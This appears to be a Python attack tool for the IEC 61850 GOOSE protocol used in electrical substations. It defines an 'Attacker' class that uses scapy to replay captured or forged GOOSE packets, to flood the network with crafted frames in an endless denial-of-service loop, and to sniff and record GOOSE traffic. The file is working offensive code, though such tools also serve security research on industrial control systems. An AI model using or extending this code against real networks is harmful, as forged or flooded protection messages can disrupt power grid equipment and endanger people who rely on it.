from goose_lib.goose import GOOSE
import scapy.all as scp
import time

class Attacker:
    def __init__(self,src_mac, dst_mac):
        self.src_mac = src_mac
        self.dst_mac = dst_mac
    
    def replay_mode(self, msg):  	
        print("\033[2J\033[;H", end='')
        print(" ________________________________")
        print("|                                |")
        print("|           GOOSE Replay         |")
        print("|________________________________|\n")
        print("[1] PCAP sender\n[2] Message sender")
        choise = int(input("Your choise: "))
        match choise:
            case 1:
                path = input("PCAP path: ")
                try:
                    pcap = scp.rdpcap(path)
                    scp.sendp(pcap)
                except FileNotFoundError:
                    print("File is not valid") 
            case 2:     
                count = int(input("How many packets: "))
                pack = self.create_pack(msg)
                for _ in range(count):
                    scp.sendp(pack)
                    time.sleep(0.2)
    
    def dos_mode(self, msg):	
        print("\033[2J\033[;H", end='')
        print(" ________________________________")
        print("|                                |")
        print("|            GOOSE DoS           |")
        print("|________________________________|\n(^C) to exit after starting")
        length = int(input("Packets per send: "))
        ms = float(input("Frequency: "))
        msgs = [self.create_pack(msg) for _ in range(length)]
        add = 0
        while True:
            scp.sendp(msgs)
            time.sleep(1/ms)
            add += length
            
    def listener_mode(self):
        print("\033[2J\033[;H", end='')
        print(" ________________________________")
        print("|                                |")
        print("|          GOOSE Listener        |")
        print("|________________________________|\n(^C) to exit after starting")
        print("\n[1] Yes\n[2] No")
        choise = input("Do you want to save traffic: ")

        match choise:
            case "1":
                name = input("Name of the file: ")
                pack = scp.sniff(prn=lambda x:x.show(), store=1, filter="ether proto 0x88b8")
                scp.wrpcap(name, pack)
            case "2":
                scp.sniff(prn=lambda x:x.show(), store=0, filter="ether proto 0x88b8")

    def create_pack(self, msg):
        goose = GOOSE(
            appId=msg["appId"], 
            gocbRef=msg["gocbRef"],
            timeAllowedToLive=msg["timeAllowedToLive"], 
            datSet=msg["datSet"], 
            goId=msg["goId"], 
            t=msg["t"], 
            stNum=msg["stNum"], 
            sqNum=msg["sqNum"], 
            simulation=msg["simulation"], 
            confRev=msg["confRev"], 
            ndsCom=msg["ndsCom"], 
            numDatSetEntries=msg["numDatSetEntries"], 
            allData=msg["allData"])
        ether_layer = scp.Ether(src=self.src_mac, dst=self.dst_mac,  type=0x88b8)
        data = scp.Raw(load=goose.generate_msg())
        packet = ether_layer/data
        return (packet)
